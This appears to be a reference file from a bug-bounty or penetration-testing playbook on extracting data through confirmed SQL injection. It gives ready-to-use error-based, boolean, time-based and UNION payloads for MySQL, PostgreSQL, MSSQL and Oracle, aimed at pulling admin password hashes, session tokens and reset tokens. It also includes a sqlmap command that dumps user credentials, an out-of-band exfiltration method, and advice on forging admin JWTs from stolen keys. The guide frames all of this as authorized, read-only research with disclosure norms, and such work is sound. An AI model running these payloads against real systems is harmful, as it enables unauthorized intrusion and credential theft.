# Blind extraction — turn a confirmed oracle into a payable secret

A confirmed oracle (`detection-fingerprint.md`) is rung 1. This file is the climb
to the read that pays. **Understand the manual gadget first**, then optionally let
`sqlmap` grind it — so you can tune past a WAF and so you keep it read-only.

## Contents
- What to extract (and stop)
- Error-based extraction — one request per VALUE, not per character
- Make the value self-verifying — the difference between High and informative
- The char-by-char gadget (boolean or time oracle)
- UNION extraction (when output reflects — grab it in one shot)
- Handing it to sqlmap (read-only, tuned)
- OOB exfil (fully blind + functions allowed)
- Convert the extracted string to real impact

## What to extract (and stop)

Take the ONE value that proves impact, in this priority — not the whole table:

1. **Admin password hash** — `users` / `admin_users` / `users_field_data`. One
   row (uid=1 / role=admin). Note crack feasibility or reuse; hand to
   `exposed-secrets` if it's a service secret.
2. **Live session / API / reset token** — `sessions`, `api_keys`,
   `resetPasswordToken`, `password_reset_tokens`. A valid token = ATO primitive.
   Extract it; do NOT spend it (rung 5).
3. **Schema you were not entitled to** — `information_schema.tables` /
   `.columns`, or a single cross-tenant row — proves the read crosses a boundary.
4. **A benign proof value** — `version()`, `current_user`, a `count` — rung-1
   confirmation when you can't yet reach a secret (grade Medium, keep climbing).

Rung 3 rule: one admin hash proves you can read the users table; you do not need
to iterate every user to "show scale." State scale by inference.

## Error-based extraction — one request per VALUE, not per character

**Try this before the char-by-char gadget.** If the app returns raw driver errors — and
anything that leaked a DBMS string during fingerprinting does — you can make the database
*compute* a value and hand it to you inside the error text. One request returns the whole
value, against ~7 requests per character for a binary search. On a 41-character hash that
is 1 request instead of ~290.

The gadget forces a type/XPATH error whose message quotes your expression's result:

| DBMS | Payload (string context) |
|---|---|
| MySQL / MariaDB | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(<EXPR>),0x7e)) AND '1'='1` |
| MySQL / MariaDB (alt) | `' AND UPDATEXML(1,CONCAT(0x7e,(<EXPR>),0x7e),1) AND '1'='1` |
| MySQL (no XML funcs) | the `FLOOR(RAND(0))` duplicate-entry form in `detection-fingerprint.md` §3 |
| MSSQL | `' AND 1=CONVERT(int,(<EXPR>))--` — the "Conversion failed … value '<result>'" message carries it |
| PostgreSQL | `' AND 1=CAST((<EXPR>) AS int)--` — "invalid input syntax for integer: \"<result>\"" |
| Oracle | `' AND 1=CTXSYS.DRITHSX.SN(1,(<EXPR>))--` — "invalid label" quotes the result |

Three operational details decide whether this works, and all three produce silent false
negatives when missed:

- **The `0x7e` (`~`) delimiters are not decoration.** They bound the value in the error
  text so you can see leading/trailing whitespace and an empty result, which otherwise
  looks identical to "the gadget didn't fire".
- **MySQL's XPATH error truncates at 32 characters.** Anything longer comes back clipped
  with no warning. Page it: `SUBSTRING((<EXPR>),<offset>,30)`, offset `1, 31, 61…`, and
  stop when a window returns empty.
- **Anchor on a base value that matches a row.** This is the trap. The injection usually
  sits in a `WHERE` clause, so if the original parameter value matches *nothing*, MySQL
  short-circuits the `AND` and **your expression is never evaluated** — you get a clean
  200 and conclude the endpoint is not injectable. Find a parameter value that returns
  real data first, and build the payload around that one.

Keep the trailing `AND '1'='1` (rather than a comment) when the query has more clauses
after the injection point; comment-out forms lose them and change the response for reasons
unrelated to your test.

## Make the value self-verifying — the difference between High and informative

Two corpus reports in this class, same primitive, opposite outcomes, and the gap is one
request:

- one proved **table existence** with a response-size differential, enumerated a few
  system tables, and wrote an impact section of "potential data extraction" and "possible
  privilege escalation" → **informative**;
- one returned a value the triager could **check on their own machine** → **high**.

So make the first extracted value one that could not have come from anywhere but
server-side execution:

```sql
SELECT 1337*7331                                  -- -> 9801547, arithmetic the DB did
SELECT LEFT(MD5(0x76616c696461746f7232303236),16) -- -> 785c247181651097
--    hex is 'validator2026';  printf 'validator2026' | md5sum   reproduces it locally
```

Neither result appears anywhere in your request, and the second is reproducible by the
person reading the report in one shell command. Put that line **in** the report. Only then
walk the identity values (`VERSION()`, `CURRENT_USER()`, `CURRENT_ROLE()`, `@@hostname`,
`@@read_only`) and the one value that proves impact.

**Never write "potential", "possible" or "could allow".** If extraction works, extract one
value and say what you read. If it does not, that is the finding's ceiling — say that
instead.

### Scope the write side explicitly — it is worth CVSS points either way

A read-only injection reported without bounding the write side invites either an inflated
severity that gets corrected, or a triager assuming the worst and then discounting. Test
the three paths and state the result:

```
'; SELECT 1; --          -> stacked queries rejected?  (compare against the same payload,
'                            single-statement, which must still return the baseline)
SELECT ... INTO OUTFILE  -> is FILE granted?  information_schema.user_privileges
information_schema.routines WHERE routine_schema='<app schema>'  -> a writable routine sink?
```

All three closed → score `I:N/A:N` and say so in the report. An over-privileged grant that
you *cannot* reach through the injection is still worth a paragraph as a least-privilege
defect — just do not claim it as integrity impact.

### Read credential metadata without copying the credential

When global `SELECT` reaches the credential store, you do not need the hash to prove
reachability, and taking it is a rung you do not need to climb:

```sql
SELECT LENGTH(authentication_string) FROM mysql.user WHERE user='<master>'  -- -> 41
SELECT LEFT(plugin,20)               FROM mysql.user WHERE user='<master>'  -- -> mysql_native_password
```

Length plus authentication plugin establishes "an unauthenticated caller can read the
master account's stored hash, in the legacy SHA1 format, which is offline-crackable" —
without the report containing credential material. State plainly that the value itself was
deliberately not extracted.

### Proving there is no PII is also evidence

If the reachable schema holds no personal data, enumerate the **complete** column list and
say the limit is stated from that list rather than assumed. A report that bounds its own
impact and shows its work is believed on the parts that remain.

**Corpus cases:** `3894400` — `h1/reports/3894400-adobe-duplicate.md` (high · duplicate;
every technique in this section came from it — the self-verifying MD5, the 32-char paging,
the row-match anchor, the three closed write paths, the credential metadata). `3507058` —
`h1/reports/3507058-hexagon_vdp-informative.md` (high · **informative**; the contrast case
— boolean oracle confirmed, nothing extracted, impact written in "potential").

## The char-by-char gadget (boolean or time oracle)

Wrap any predicate around a substring of a subquery and binary-search the byte:

```
-- generic predicate P over the i-th char of the target string:
ASCII(SUBSTRING((<subquery>),<i>,1)) > <mid>
-- boolean oracle: true page vs false page tells you the bit
-- time oracle:    IF(<P>, SLEEP(5), 0)   /   CASE WHEN <P> THEN pg_sleep(5) ELSE pg_sleep(0) END
```

Binary search the printable range (32–126): ~7 requests/char instead of 95.
Length first so you know when to stop: `LENGTH((<subquery>))=<n>`.

Dialect substring forms (from the fingerprint table):
- MySQL/MSSQL: `SUBSTRING((SELECT pass FROM users WHERE id=1),i,1)`
- PostgreSQL: `SUBSTRING((SELECT pass FROM users_field_data WHERE uid=1) FROM i FOR 1)`
- Oracle: `SUBSTR((SELECT ... FROM ...),i,1)`

Concrete boolean extraction of the admin hash (MySQL):
```
GET /product?id=5 AND ASCII(SUBSTRING((SELECT password FROM users ORDER BY id LIMIT 1),1,1))>64 -- -
# true-page vs false-page differential = bit; walk i=1..len, binary-search each
```

Concrete time extraction (Postgres, when nothing reflects):
```
GET /product?id=5;SELECT CASE WHEN (ASCII(SUBSTRING((SELECT pass FROM users_field_data WHERE uid=1) FROM 1 FOR 1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## UNION extraction (when output reflects — grab it in one shot)

After finding the printable column (`detection-fingerprint.md` §5), select the
secret directly instead of bit-by-bit:

```
' UNION SELECT NULL, CONCAT(email,':',pass), NULL FROM users WHERE id=1-- -            (MySQL)
' UNION SELECT NULL, email||':'||pass, NULL FROM users_field_data WHERE uid=1--        (Postgres)
```

Schema first if you don't know table/column names:
```
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
```
Grab the ONE row you need (admin), not the whole dump.

## Handing it to sqlmap (read-only, tuned)

Once you have the exact request + confirmed technique, sqlmap grinds the
char-by-char faster than by hand. Save the raw request (with your session) to
`req.txt` and constrain it hard so it never writes and never over-fetches:

```bash
sqlmap -r req.txt --batch \
  --dbms=postgresql \            # you already fingerprinted — don't let it guess
  --technique=BT \               # Boolean + Time only; no stacked (S), no error-write
  -p sort \                      # the exact param you confirmed
  --dump -T users -C "email,password" --where "id=1" \  # ONE row, not the table
  --threads=2 --time-sec=5       # gentle; short delay
```

Never pass `--os-shell`, `--sql-shell` with writes, `--file-write`, `--priv-esc`,
or `--dump-all`. sqlmap is an extractor here, not an exploiter. If it wants to
run a stacked-query test that could write, decline — you confirmed the oracle
manually, keep it `BT`.

## OOB exfil (fully blind + functions allowed)

Smuggle the value out through a DNS/HTTP hit to your **own** collaborator (see
`detection-fingerprint.md` §6). One value in the subdomain label proves the
read; do not stream the table. Never use the write/RCE OOB variants
(`xp_cmdshell`, `COPY … TO PROGRAM`, `INTO OUTFILE`).

## Convert the extracted string to real impact

Extraction is not the endpoint — the *use* is:
- Admin hash -> note it's crackable/reused (don't stop at "I have a hash").
- Ghost `api_keys` id+secret -> sign the Admin JWT and read one admin object
  read-only (`cms-cve-chains.md`) — that's the takeover proof.
- `resetPasswordToken` -> its valid presence/format IS the ATO proof; do NOT
  consume it on prod (rung 5 — not attempted: d0x's approval before execution).
- Any service key/secret you pulled -> `exposed-secrets` +
  `../../_shared/references/public-by-default-keys.md`.
